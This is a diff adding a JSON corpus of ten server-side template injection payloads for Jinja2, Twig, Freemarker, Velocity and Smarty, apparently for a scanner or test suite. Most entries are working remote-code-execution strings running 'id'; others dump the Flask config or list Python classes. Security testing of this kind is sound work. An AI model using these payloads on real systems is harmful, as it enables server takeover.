@@ -1,0 +1,102 @@
+[
+  {
+    "id": "ssti-001",
+    "family": "ssti",
+    "subtype": "jinja2",
+    "payload_string": "{{7*7}}",
+    "context": "template",
+    "description": "Jinja2 SSTI detection using arithmetic expression",
+    "references": ["https://portswigger.net/web-security/server-side-template-injection"],
+    "platform_specific": {"jinja2": true}
+  },
+  {
+    "id": "ssti-002",
+    "family": "ssti",
+    "subtype": "jinja2",
+    "payload_string": "{{config.items()}}",
+    "context": "template",
+    "description": "Jinja2 SSTI to dump Flask configuration",
+    "references": ["https://portswigger.net/web-security/server-side-template-injection"],
+    "platform_specific": {"jinja2": true}
+  },
+  {
+    "id": "ssti-003",
+    "family": "ssti",
+    "subtype": "jinja2",
+    "payload_string": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    "context": "template",
+    "description": "Jinja2 SSTI RCE via os module",
+    "references": ["https://portswigger.net/web-security/server-side-template-injection/cheat-sheet"],
+    "platform_specific": {"jinja2": true, "flask": true}
+  },
+  {
+    "id": "ssti-004",
+    "family": "ssti",
+    "subtype": "twig",
+    "payload_string": "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
+    "context": "template",
+    "description": "Twig SSTI RCE via registerUndefinedFilterCallback",
+    "references": ["https://portswigger.net/web-security/server-side-template-injection"],
+    "platform_specific": {"twig": true}
+  },
+  {
+    "id": "ssti-005",
+    "family": "ssti",
+    "subtype": "freemarker",
+    "payload_string": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+    "context": "template",
+    "description": "Freemarker SSTI RCE via Execute built-in",
+    "references": ["https://portswigger.net/web-security/server-side-template-injection"],
+    "platform_specific": {"freemarker": true}
+  },
+  {
+    "id": "ssti-006",
+    "family": "ssti",
+    "subtype": "velocity",
+    "payload_string": "#set($x='')  #set($rt=$x.class.forName('java.lang.Runtime'))  #set($chr=$x.class.forName('java.lang.Character'))  #set($str=$x.class.forName('java.lang.String'))  #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor()  #set($out=$ex.getInputStream())  #foreach($i in [1..$out.available()]) $str.valueOf($chr.toChars($out.read())) #end",
+    "context": "template",
+    "description": "Apache Velocity SSTI RCE via Runtime.exec",
+    "references": ["https://portswigger.net/web-security/server-side-template-injection"],
+    "platform_specific": {"velocity": true}
+  },
+  {
+    "id": "ssti-007",
+    "family": "ssti",
+    "subtype": "smarty",
+    "payload_string": "{system('id')}",
+    "context": "template",
+    "description": "Smarty SSTI RCE via system function",
+    "references": ["https://portswigger.net/web-security/server-side-template-injection"],
+    "platform_specific": {"smarty": true}
+  },
+  {
+    "id": "ssti-008",
+    "family": "ssti",
+    "subtype": "jinja2",
+    "payload_string": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+    "context": "template",
+    "description": "Jinja2 SSTI to enumerate available Python classes",
+    "references": ["https://portswigger.net/web-security/server-side-template-injection/cheat-sheet"],
+    "platform_specific": {"jinja2": true}
+  },
+  {
+    "id": "ssti-009",
+    "family": "ssti",
+    "subtype": "jinja2",
+    "payload_string": "{{lipsum.__globals__['os'].popen('id').read()}}",
+    "context": "template",
+    "description": "Jinja2 SSTI RCE via lipsum global access",
+    "references": ["https://portswigger.net/web-security/server-side-template-injection/cheat-sheet"],
+    "platform_specific": {"jinja2": true, "flask": true}
+  },
+  {
+    "id": "ssti-010",
+    "family": "ssti",
+    "subtype": "freemarker",
+    "payload_string": "[(class.forName('java.lang.ProcessBuilder').getMethods()[6].invoke(['id']))]",
+    "context": "template",
+    "description": "Freemarker SSTI RCE via ProcessBuilder",
+    "references": ["https://portswigger.net/web-security/server-side-template-injection"],
+    "platform_specific": {"freemarker": true}
+  }
+]
